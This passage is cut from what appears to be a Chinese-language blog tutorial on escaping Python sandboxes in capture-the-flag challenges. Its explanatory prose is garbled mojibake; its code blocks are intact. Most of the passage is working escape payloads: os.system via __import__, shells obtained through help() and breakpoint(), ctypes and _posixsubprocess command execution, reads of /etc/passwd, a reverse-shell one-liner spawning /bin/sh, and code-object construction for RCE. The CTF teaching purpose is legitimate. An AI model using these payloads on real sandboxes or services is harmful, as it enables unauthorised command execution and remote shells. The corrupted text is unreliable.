class="string">&#x27;/etc/passwd&#x27;</span>).read()</span><br></pre></td></tr></table></figure><p>é…åˆ <code>__import__</code> å¯ä»¥å®ç°åŠ¨æ€å¯¼å…¥æ¨¡å—å¹¶æ‰§è¡Œå‘½ä»¤ã€‚</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">__import__</span>(<span class="string">&#x27;os&#x27;</span>).system(<span class="string">&#x27;ls&#x27;</span>)&gt;&gt;&gt; __builtins__.<span class="built_in">__import__</span></span><br><span class="line">&lt;built-<span class="keyword">in</span> function <span class="built_in">__import__</span>&gt;</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>__builtins__.<span class="built_in">__import__</span>(<span class="string">&#x27;os&#x27;</span>).system(<span class="string">&#x27;ls&#x27;</span>)</span><br></pre></td></tr></table></figure><p>ç”±äºæ¯ä¸ªå¯¼å…¥çš„æ¨¡å—éƒ½ä¼šç•™å­˜ä¸€ä¸ª <code>__builtins__</code> å±æ€§ï¼Œå› æ­¤æˆ‘ä»¬å¯ä»¥åœ¨ä»»æ„çš„æ¨¡å—ä¸­é€šè¿‡ <code>__builtins__</code> æ¥å¼•å…¥æ¨¡å—æˆ–è€…æ‰§è¡Œæ–‡ä»¶æ“ä½œã€‚éœ€è¦æ³¨æ„çš„æ˜¯ï¼Œ <code>__builtins__</code> åœ¨æ¨¡å—çº§åˆ«å’Œå…¨å±€çº§åˆ«çš„è¡¨ç°æœ‰æ‰€ä¸åŒã€‚</p><p>åœ¨å…¨å±€çº§åˆ«ï¼ˆä¹Ÿå°±æ˜¯ä½ åœ¨ Python äº¤äº’å¼è§£é‡Šå™¨ä¸­ç›´æ¥æŸ¥çœ‹<code>__builtins__</code>æ—¶ï¼‰ï¼Œ<code>__builtins__</code>å®é™…ä¸Šæ˜¯ä¸€ä¸ªæ¨¡å—<code>&lt;module &#39;__builtin__&#39; (built-in)&gt;</code>ã€‚</p><p>åœ¨æ¨¡å—çº§åˆ«ï¼ˆä¹Ÿå°±æ˜¯ä½ åœ¨ä¸€ä¸ª Python è„šæœ¬ä¸­æŸ¥çœ‹<code>__builtins__</code>ï¼‰ï¼Œ<code>__builtins__</code>æ˜¯ä¸€ä¸ªå­—å…¸ï¼Œè¿™ä¸ªå­—å…¸åŒ…å«äº†<code>__builtin__</code>æ¨¡å—ä¸­æ‰€æœ‰çš„å‡½æ•°å’Œç±»ã€‚</p><p>å› æ­¤ï¼Œå½“é€šè¿‡å…¶ä»–æ¨¡å—çš„ <code>__builtins__</code>æ—¶ï¼Œå¦‚<code>__import__(&#39;types&#39;).__builtins__</code>æ—¶ï¼Œå®é™…ä¸Šçœ‹åˆ°çš„æ˜¯ä¸€ä¸ªå­—å…¸ï¼ŒåŒ…å«äº†æ‰€æœ‰çš„å†…å»ºå‡½æ•°å’Œç±»ã€‚æ­¤æ—¶è°ƒç”¨çš„æ–¹å¼æœ‰æ‰€å˜åŒ–ã€‚</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="built_in">__import__</span>(<span class="string">&#x27;types&#x27;</span>).__builtins__[<span class="string">&#x27;__import__&#x27;</span>]</span><br><span class="line">&lt;built-<span class="keyword">in</span> function <span class="built_in">__import__</span>&gt;</span><br></pre></td></tr></table></figure><h4 id="help-1"><a href="#help-1" class="headerlink" title="help"></a><code>help</code></h4><p>help å‡½æ•°å¯ä»¥æ‰“å¼€å¸®åŠ©æ–‡æ¡£. ç´¢å¼•åˆ° os æ¨¡å—ä¹‹åå¯ä»¥æ‰“å¼€ sh</p><p>åœ¨ä¸‹é¢çš„ç¯å¢ƒ</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">eval</span>((<span class="built_in">__import__</span>(<span class="string">&quot;re&quot;</span>).sub(<span class="string">r&#x27;[a-z0-9]&#x27;</span>,<span class="string">&#x27;&#x27;</span>,<span class="built_in">input</span>(<span class="string">&quot;code &gt; &quot;</span>).lower()))[:<span class="number">130</span>])</span><br></pre></td></tr></table></figure><p>å½“æˆ‘ä»¬è¾“å…¥ help æ—¶ï¼Œæ³¨æ„è¦è¿›è¡Œ unicode ç¼–ç ï¼Œhelp å‡½æ•°ä¼šæ‰“å¼€å¸®åŠ©æ–‡æ¡£ã€‚</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">help</span>()</span><br></pre></td></tr></table></figure><p>è¾“å…¥ <code>os</code> , ä¼šè¿›å…¥ <code>os</code> çš„å¸®åŠ©æ–‡æ¡£</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">help</span>&gt; os</span><br></pre></td></tr></table></figure><p>ç„¶ååœ¨è¾“å…¥ !sh å°±å¯ä»¥æ‹¿åˆ° &#x2F;bin&#x2F;sh, è¾“å…¥ !bash åˆ™å¯ä»¥æ‹¿åˆ° &#x2F;bin&#x2F;bash</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">help</span>&gt; os</span><br><span class="line">$ <span class="built_in">ls</span></span><br><span class="line">a-z0-9.py  exp2.py  exp.py  flag.txt</span><br><span class="line">$</span><br></pre></td></tr></table></figure><h4 id="breakpoint"><a href="#breakpoint" class="headerlink" title="breakpoint"></a><code>breakpoint</code></h4><p>pdb æ¨¡å—å®šä¹‰äº†ä¸€ä¸ªäº¤äº’å¼æºä»£ç è°ƒè¯•å™¨ï¼Œç”¨äº Python ç¨‹åºã€‚å®ƒæ”¯æŒåœ¨æºç è¡Œé—´è®¾ç½®ï¼ˆæœ‰æ¡ä»¶çš„ï¼‰æ–­ç‚¹å’Œå•æ­¥æ‰§è¡Œï¼Œæ£€è§†å †æ ˆå¸§ï¼Œåˆ—å‡ºæºç åˆ—è¡¨ï¼Œä»¥åŠåœ¨ä»»ä½•å †æ ˆå¸§çš„ä¸Šä¸‹æ–‡ä¸­è¿è¡Œä»»æ„ Python ä»£ç ã€‚å®ƒè¿˜æ”¯æŒäº‹åè°ƒè¯•ï¼Œå¯ä»¥åœ¨ç¨‹åºæ§åˆ¶ä¸‹è°ƒç”¨ã€‚</p><p>åœ¨è¾“å…¥ breakpoint() åå¯ä»¥ä»£å¼€ Pdb ä»£ç è°ƒè¯•å™¨ï¼Œåœ¨å…¶ä¸­å°±å¯ä»¥æ‰§è¡Œä»»æ„ python ä»£ç </p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">&gt;&gt;&gt; ğ˜£ğ˜³ğ˜¦ğ˜¢ğ˜¬ğ˜±ğ˜°ğ˜ªğ˜¯ğ˜µ()</span><br><span class="line">--Return--</span><br><span class="line">&gt; &lt;stdin&gt;(1)&lt;module&gt;()-&gt;None</span><br><span class="line">(Pdb) __import__(<span class="string">&#x27;os&#x27;</span>).system(<span class="string">&#x27;ls&#x27;</span>)</span><br><span class="line">a-z0-9.py  exp2.py  exp.py  flag.txt</span><br><span class="line">0</span><br><span class="line">(Pdb) __import__(<span class="string">&#x27;os&#x27;</span>).system(<span class="string">&#x27;sh&#x27;</span>)</span><br><span class="line">$ <span class="built_in">ls</span></span><br><span class="line">a-z0-9.py  exp2.py  exp.py  flag.txt</span><br></pre></td></tr></table></figure><h4 id="ctypes"><a href="#ctypes" class="headerlink" title="ctypes"></a><code>ctypes</code></h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> ctypes</span><br><span class="line"></span><br><span class="line">libc = ctypes.CDLL(<span class="literal">None</span>)</span><br><span class="line">libc.system(<span class="string">&#x27;ls ./&#x27;</span>.encode())  <span class="comment"># ä½¿ç”¨ encode() æ–¹æ³•å°†å­—ç¬¦ä¸²è½¬æ¢ä¸ºå­—èŠ‚å­—ç¬¦ä¸²</span></span><br></pre></td></tr></table></figure><p>in sandbox</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">__import__</span>(<span class="string">&#x27;ctypes&#x27;</span>).CDLL(<span class="literal">None</span>).system(<span class="string">&#x27;ls /&#x27;</span>.encode())</span><br></pre></td></tr></table></figure><h4 id="threading"><a href="#threading" class="headerlink" title="threading"></a><code>threading</code></h4><p>using new thread to execute command</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> threading</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">func</span>():</span><br><span class="line">    os.system(<span class="string">&#x27;ls&#x27;</span>)  <span class="comment"># åœ¨æ–°çš„çº¿ç¨‹ä¸­æ‰§è¡Œå‘½ä»¤</span></span><br><span class="line"></span><br><span class="line">t = threading.Thread(target=func)  <span class="comment"># åˆ›å»ºä¸€ä¸ªæ–°çš„çº¿ç¨‹</span></span><br><span class="line">t.start()  <span class="comment"># å¼€å§‹æ‰§è¡Œæ–°çš„çº¿ç¨‹</span></span><br></pre></td></tr></table></figure><p>in one line:</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># eval, exec éƒ½å¯ä»¥æ‰§è¡Œçš„ç‰ˆæœ¬</span></span><br><span class="line"><span class="built_in">__import__</span>(<span class="string">&#x27;threading&#x27;</span>).Thread(target=<span class="keyword">lambda</span>: <span class="built_in">__import__</span>(<span class="string">&#x27;os&#x27;</span>).system(<span class="string">&#x27;ls&#x27;</span>)).start()</span><br><span class="line"></span><br><span class="line"><span class="comment"># exec å¯æ‰§è¡Œ</span></span><br><span class="line"><span class="keyword">import</span> threading, os; threading.Thread(target=<span class="keyword">lambda</span>: os.system(<span class="string">&#x27;ls&#x27;</span>)).start()</span><br></pre></td></tr></table></figure><h4 id="multprocessing"><a href="#multprocessing" class="headerlink" title="multprocessing"></a><code>multprocessing</code></h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> multiprocessing</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">func</span>():</span><br><span class="line">    os.system(<span class="string">&#x27;ls&#x27;</span>)</span><br><span class="line"></span><br><span class="line">p = multiprocessing.Process(target=func)</span><br><span class="line">p.start()</span><br></pre></td></tr></table></figure><p>in one line:</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">__import__</span>(<span class="string">&#x27;multiprocessing&#x27;</span>).Process(target=<span class="keyword">lambda</span>: <span class="built_in">__import__</span>(<span class="string">&#x27;os&#x27;</span>).system(<span class="string">&#x27;ls&#x27;</span>)).start()</span><br></pre></td></tr></table></figure><h4 id="posixsubprocess"><a href="#posixsubprocess" class="headerlink" title="_posixsubprocess"></a><code>_posixsubprocess</code></h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">import</span> _posixsubprocess</span><br><span class="line"></span><br><span class="line">_posixsubprocess.fork_exec([<span class="string">b&quot;/bin/cat&quot;</span>,<span class="string">&quot;/etc/passwd&quot;</span>], [<span class="string">b&quot;/bin/cat&quot;</span>], <span class="literal">True</span>, (), <span class="literal">None</span>, <span class="literal">None</span>, -<span class="number">1</span>, -<span class="number">1</span>, -<span class="number">1</span>, -<span class="number">1</span>, -<span class="number">1</span>, -<span class="number">1</span>, *(os.pipe()), <span class="literal">False</span>, <span class="literal">False</span>,<span class="literal">False</span>, <span class="literal">None</span>, <span class="literal">None</span>, <span class="literal">None</span>, -<span class="number">1</span>, <span class="literal">None</span>, <span class="literal">False</span>)</span><br></pre></td></tr></table></figure><p>ç»“åˆ <strong>loader</strong>.load_module(fullname) å¯¼å…¥æ¨¡å—</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">__loader__.load_module(<span class="string">&#x27;_posixsubprocess&#x27;</span>).fork_exec([<span class="string">b&quot;/bin/cat&quot;</span>,<span class="string">&quot;/etc/passwd&quot;</span>], [<span class="string">b&quot;/bin/cat&quot;</span>], <span class="literal">True</span>, (), <span class="literal">None</span>, <span class="literal">None</span>, -<span class="number">1</span>, -<span class="number">1</span>, -<span class="number">1</span>, -<span class="number">1</span>, -<span class="number">1</span>, -<span class="number">1</span>, *(__loader__.load_module(<span class="string">&#x27;os&#x27;</span>).pipe()), <span class="literal">False</span>, <span class="literal">False</span>,<span class="literal">False</span>, <span class="literal">None</span>, <span class="literal">None</span>, <span class="literal">None</span>, -<span class="number">1</span>, <span class="literal">None</span>, <span class="literal">False</span>)</span><br></pre></td></tr></table></figure><h4 id="åå¼¹shell"><a href="#åå¼¹shell" class="headerlink" title="åå¼¹shell"></a>åå¼¹<code>shell</code></h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((<span class="string">&quot;127.0.0.1&quot;</span>,<span class="number">12345</span>));os.dup2(s.fileno(),<span class="number">0</span>); os.dup2(s.fileno(),<span class="number">1</span>);os.dup2(s.fileno(),<span class="number">2</span>);<span class="keyword">import</span> pty; pty.spawn(<span class="string">&quot;/bin/sh&quot;</span>)</span><br></pre></td></tr></table></figure><p>in one line</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">s=<span class="built_in">__import__</span>(<span class="string">&#x27;socket&#x27;</span>).socket(<span class="built_in">__import__</span>(<span class="string">&#x27;socket&#x27;</span>).AF_INET,<span class="built_in">__import__</span>(<span class="string">&#x27;socket&#x27;</span>).SOCK_STREAM);s.connect((<span class="string">&quot;127.0.0.1&quot;</span>,<span class="number">12345</span>));[<span class="built_in">__import__</span>(<span class="string">&#x27;os&#x27;</span>).dup2(s.fileno(),i) <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">3</span>)];<span class="built_in">__import__</span>(<span class="string">&#x27;pty&#x27;</span>).spawn(<span class="string">&quot;/bin/sh&quot;</span>)</span><br></pre></td></tr></table></figure><h4 id="æ„é€ ä»£ç å¯¹è±¡è¿›è¡Œ-RCE"><a href="#æ„é€ ä»£ç å¯¹è±¡è¿›è¡Œ-RCE" class="headerlink" title="æ„é€ ä»£ç å¯¹è±¡è¿›è¡Œ RCE"></a>æ„é€ ä»£ç å¯¹è±¡è¿›è¡Œ RCE</h4><p><code>CodeType</code> æ˜¯ python çš„å†…ç½®ç±»å‹ä¹‹ä¸€ï¼Œç”¨äºè¡¨ç¤ºç¼–è¯‘åçš„å­—èŠ‚ç å¯¹è±¡ã€‚<code>odeType</code> å¯¹è±¡åŒ…å«äº†å‡½æ•°ã€æ–¹æ³•æˆ–æ¨¡å—çš„å­—èŠ‚ç æŒ‡ä»¤åºåˆ—ä»¥åŠä¸ä¹‹ç›¸å…³çš„å±æ€§ã€‚</p><p>CodeType å¯¹è±¡å…·æœ‰ä»¥ä¸‹å±æ€§ï¼š</p><ul><li>co_argcount: å‡½æ•°çš„å‚æ•°æ•°é‡ï¼Œä¸åŒ…æ‹¬å¯å˜å‚æ•°å’Œå…³é”®å­—å‚æ•°ã€‚</li><li>co_cellvars: å‡½æ•°å†…éƒ¨ä½¿ç”¨çš„é—­åŒ…å˜é‡çš„åç§°åˆ—è¡¨ã€‚</li><li>co_code: å‡½æ•°çš„å­—èŠ‚ç æŒ‡ä»¤åºåˆ—ï¼Œä»¥äºŒè¿›åˆ¶å½¢å¼è¡¨ç¤ºã€‚</li><li>co_consts: å‡½æ•°ä¸­ä½¿ç”¨çš„å¸¸é‡çš„å…ƒç»„ï¼ŒåŒ…æ‹¬æ•´æ•°ã€æµ®ç‚¹æ•°ã€å­—ç¬¦ä¸²ç­‰ã€‚</li><li>co_exceptiontable: å¼‚å¸¸å¤„ç†è¡¨ï¼Œç”¨äºæè¿°å‡½æ•°ä¸­çš„å¼‚å¸¸å¤„ç†ã€‚</li><li>co_filename: å‡½æ•°æ‰€åœ¨çš„æ–‡ä»¶åã€‚</li><li>co_firstlineno: å‡½æ•°å®šä¹‰çš„ç¬¬ä¸€è¡Œæ‰€åœ¨çš„è¡Œå·ã€‚</li><li>co_flags: å‡½æ•°çš„æ ‡å¿—ä½ï¼Œè¡¨ç¤ºå‡½æ•°çš„å±æ€§å’Œç‰¹å¾ï¼Œå¦‚æ˜¯å¦æœ‰é»˜è®¤å‚æ•°ã€æ˜¯å¦æ˜¯ç”Ÿæˆå™¨å‡½æ•°ç­‰ã€‚</li><li>co_freevars: å‡½æ•°ä¸­ä½¿ç”¨çš„è‡ªç”±å˜é‡çš„åç§°åˆ—è¡¨ï¼Œè‡ªç”±å˜é‡æ˜¯åœ¨å‡½æ•°å¤–éƒ¨å®šä¹‰ä½†åœ¨å‡½æ•°å†…éƒ¨è¢«å¼•ç”¨çš„å˜é‡ã€‚</li><li>co_kwonlyargcount: å‡½æ•°çš„å…³é”®å­—å‚æ•°æ•°é‡ã€‚</li><li>co_lines: å‡½æ•°çš„æºä»£ç è¡Œåˆ—è¡¨ã€‚</li><li>co_linetable: å‡½æ•°çš„è¡Œå·å’Œå­—èŠ‚ç æŒ‡ä»¤ç´¢å¼•ä¹‹é—´çš„æ˜ å°„è¡¨ã€‚</li><li>co_lnotab: è¡¨ç¤ºè¡Œå·å’Œå­—èŠ‚ç æŒ‡ä»¤ç´¢å¼•ä¹‹é—´çš„æ˜ å°„å…³ç³»çš„å­—ç¬¦ä¸²ã€‚</li><li>co_name: å‡½æ•°çš„åç§°ã€‚</li><li>co_names: å‡½æ•°ä¸­ä½¿ç”¨çš„å…¨å±€å˜é‡çš„åç§°åˆ—è¡¨ã€‚</li><li>co_nlocals: å‡½æ•°ä¸­å±€éƒ¨å˜é‡çš„æ•°é‡ã€‚</li><li>co_positions: å‡½æ•°ä¸­ä¸ä½ç½®ç›¸å…³çš„å˜é‡ï¼ˆæ¯”å¦‚é—­åŒ…ä¸­çš„è‡ªç”±å˜é‡ï¼‰çš„åç§°åˆ—è¡¨ã€‚</li><li>co_posonlyargcount: å‡½æ•°çš„ä»…ä½ç½®å‚æ•°æ•°é‡ã€‚</li><li>co_qualname: å‡½æ•°çš„é™å®šåç§°ï¼ŒåŒ…å«äº†å‡½æ•°æ‰€åœ¨çš„æ¨¡å—å’Œç±»åã€‚</li><li>co_stacksize: å‡½æ•°çš„å †æ ˆå¤§å°ï¼Œè¡¨ç¤ºå‡½æ•°æ‰§è¡Œæ—¶æ‰€éœ€çš„å †æ ˆç©ºé—´ã€‚</li><li>co_varnames: å‡½æ•°ä¸­å±€éƒ¨å˜é‡çš„åç§°åˆ—è¡¨ã€‚</li></ul><p>å‡è®¾å­˜åœ¨å¦‚ä¸‹çš„ä¸€ä¸ªå‡½æ•°.</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">get_flag</span>(<span class="params">some_input</span>):</span><br><span class="line">    var1=<span class="number">1</span></span><br><span class="line">    var2=<span class="string">&quot;secretcode&quot;</span></span><br><span class="line">    var3=[<span class="string">&quot;some&quot;</span>,<span class="string">&quot;array&quot;</span>]</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">calc_flag</span>(<span class="params">flag_rot2</span>):</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&#x27;&#x27;</span>.join(<span class="built_in">chr</span>(<span class="built_in">ord</span>(c)-<span class="number">2</span>) <span class="keyword">for</span> c <span class="keyword">in</span> flag_rot2)</span><br><span class="line">    <span class="keyword">if</span> some_input == var2:</span><br><span class="line">        <span class="keyword">return</span> calc_flag(<span class="string">&quot;VjkuKuVjgHnci&quot;</span>)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;Nope&quot;</span></span><br></pre></td></tr></table></figure><p>æˆ‘ä»¬å¯ä»¥é€šè¿‡ <code>get_flag.__code__</code> è·å–å…¶ä»£ç å¯¹è±¡. ä»£ç å¯¹è±¡åŒ…å«äº†å…³äºä»£ç çš„æ‰€æœ‰ä¿¡æ¯, ä¾‹å¦‚ co_code å±æ€§å­˜å‚¨äº†å­—èŠ‚ç ä¿¡æ¯, å› æ­¤ä¿®æ”¹è¿™ä¸ªå­—èŠ‚ç å°±å¯ä»¥è¾¾åˆ°ä¿®æ”¹å‡½æ•°æ‰§è¡Œçš„ç›®çš„, ä½†éœ€è¦æ³¨æ„çš„æ˜¯ï¼Œpython å¯ä»¥å°†æŸä¸ªå‡½æ•°çš„ <code>__code__</code> å¯¹è±¡æ•´ä¸ªè¿›è¡Œä¿®æ”¹ã€‚ä»…ä»…ä¿®æ”¹å…¶ä¸­çš„å­å±æ€§æ˜¯ä¸è¡Œçš„ã€‚å¦‚ä¸‹æ‰€ç¤º, python ä¼šæŠ›å‡ºå¼‚å¸¸.</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span>get_flag.__code__.co_code</span><br><span class="line"><span class="string">b&#x27;\x97\x00d\x01&#125;\x01d\x02&#125;\x02d\x03d\x04g\x02&#125;\x03d\x05\x84\x00&#125;\x04|\x00|\x02k\x02\x00\x00\x00\x00r\x0b\x02\x00|\x04d\x06\xa6\x01\x00\x00\xab\x01\x00\x00\x00\x00\x00\x00\x00\x00S\x00d\x07S\x00&#x27;</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>get_flag.__code__.co_code = <span class="number">1</span></span><br><span class="line">Traceback (most recent call last):</span><br><span class="line">  File <span class="string">&quot;&lt;stdin&gt;&quot;</span>, line <span class="number">1</span>, <span class="keyword">in</span> &lt;module&gt;</span><br><span class="line">AttributeError: attribute <span class="string">&#x27;co_code&#x27;</span> of <span class="string">&#x27;code&#x27;</span> objects <span class="keyword">is</span> <span class="keyword">not</span> writable</span><br></pre></td></tr></table></figure><p>è¿™ç§æƒ…å†µä¸‹,æˆ‘ä»¬éœ€è¦æ„é€ ä¸€ä¸ªæ–°çš„ä»£ç å¯¹è±¡å¹¶ä¸»åŠ¨æ‰§è¡Œ.å…·ä½“æ­¥éª¤å¦‚ä¸‹ï¼š</p><ol><li><p>ç¬¬ä¸€æ­¥ï¼Œæœ¬åœ°æ„é€  payload</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">read</span>():</span><br><span class="line"> <span class="keyword">return</span> <span class="built_in">print</span>(<span class="built_in">open</span>(<span class="string">&quot;/etc/passwd&quot;</span>,<span class="string">&#x27;r&#x27;</span>).read())</span><br></pre></td></tr></table></figure></li><li><p>è·å–åˆ›å»ºä»£ç å¯¹è±¡æ‰€éœ€çš„å‚æ•°, é€šè¿‡ <code>help</code> æˆ–è€… <code>__doc__</code> å±æ€§è¿›è¡Œè·å–, ä¸åŒçš„ç‰ˆæœ¬æœ‰æ‰€å·®å¼‚ï¼Œ æˆ‘åœ¨æœ¬åœ°æµ‹è¯•æ—¶ç‰ˆæœ¬ä¸º python 3.11.2ï¼Œæ­¤æ—¶ code éœ€è¦ä¼ å…¥ 17 ä¸ªå‚æ•°ï¼Œä¸”ä¸æ”¯æŒå…³é”®å­—ä¼ é€’ã€‚</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&gt;&gt;&gt;&gt; <span class="keyword">import</span> types</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="built_in">help</span>(types.CodeType)</span><br><span class="line">code(argcount, posonlyargcount, kwonlyargcount, nlocals, stacksize, flags, codestring, constants, names, varnames, filename, name, qualname, firstlineno, linetable, exceptiontable, freevars=(), cellvars=(), /)</span><br></pre></td></tr></table></figure></li><li><p>å‚æ•°èµ‹å€¼ã€‚è·å–åˆ°æ‰€éœ€çš„å‚æ•°ä¹‹åï¼Œæˆ‘ä»¬å¯ä»¥å°†è¿™äº›å‚æ•°å…ˆä¿å­˜åœ¨å˜é‡ä¸­ã€‚</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">code = read.__code__</span><br><span class="line"></span><br><span class="line">argcount = code.co_argcount</span><br><span class="line">posonlyargcount = code.co_posonlyargcount</span><br><span class="line">kwonlyargcount = code.co_kwonlyargcount</span><br><span class="line">nlocals = code.co_nlocals</span><br><span class="line">stacksize = code.co_stacksize</span><br><span class="line">flags = code.co_flags</span><br><span class="line">codestring = code.co_code</span><br><span class="line">constants = code.co_consts</span><br><span class="line">names = code.co_names</span><br><span class="line">varnames = code.co_varnames</span><br><span class="line">filename = code.co_filename</span><br><span class="line">name = code.co_name</span><br><span class="line">qualname = code.co_qualname</span><br><span class="line">firstlineno = code.co_firstlineno</span><br><span class="line">linetable = code.co_linetable</span><br><span class="line">exceptiontable = code.co_exceptiontable</span><br><span class="line">freevars = code.co_freevars</span><br><span class="line">cellvars = code.co_cellvars</span><br></pre></td></tr></table></figure></li><li><p>åˆ›å»ºä»£ç å¯¹è±¡ã€‚åˆ›å»ºä»£ç å¯¹è±¡éœ€è¦è°ƒç”¨ <code>types.CodeType</code>ã€‚</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> types</span><br><span class="line">codeobj = types.CodeType(argcount, posonlyargcount, kwonlyargcount, nlocals, stacksize, flags, codestring, constants, names, varnames, filename, name, qualname, firstlineno, linetable, exceptiontable, freevars, cellvars)</span><br></pre></td></tr></table></figure><p>or</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">code_type = <span class="built_in">type</span>((<span class="keyword">lambda</span>: <span class="literal">None</span>).__code__)</span><br></pre></td></tr></table></figure></li><li><p>è°ƒç”¨å‡½æ•°ã€‚ä»ä»£ç å¯¹è±¡è¿›è¡Œè°ƒç”¨éœ€è¦åˆ›å»ºä¸€ä¸ªå‡½æ•°å¯¹è±¡, è·å–è¿™ä¸ªç±»å¯ä»¥ä½¿ç”¨ <code>type</code> å‡½æ•°ï¼Œæˆ–è€…ç›´æ¥ <code>import</code></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">function_type = <span class="built_in">type</span>(<span class="keyword">lambda</span>: <span class="literal">None</span>)</span><br></pre></td></tr></table></figure><p>åˆ›å»ºå‡½æ•°å¯¹è±¡æ‰€éœ€çš„å‚æ•°å¦‚ä¸‹ï¼Œå¯ä»¥é€šè¿‡ help å‡½æ•°æŸ¥çœ‹</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">function(code, <span class="built_in">globals</span>, name=<span class="literal">None</span>, argdefs=<span class="literal">None</span>, closure=<span class="literal">None</span>)</span><br></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">mydict = &#123;&#125;</span><br><span class="line">mydict[<span class="string">&#x27;__builtins__&#x27;</span>] = __builtins__</span><br><span class="line">function_type(codeobj, mydict, <span class="literal">None</span>, <span class="literal">None</span>, <span 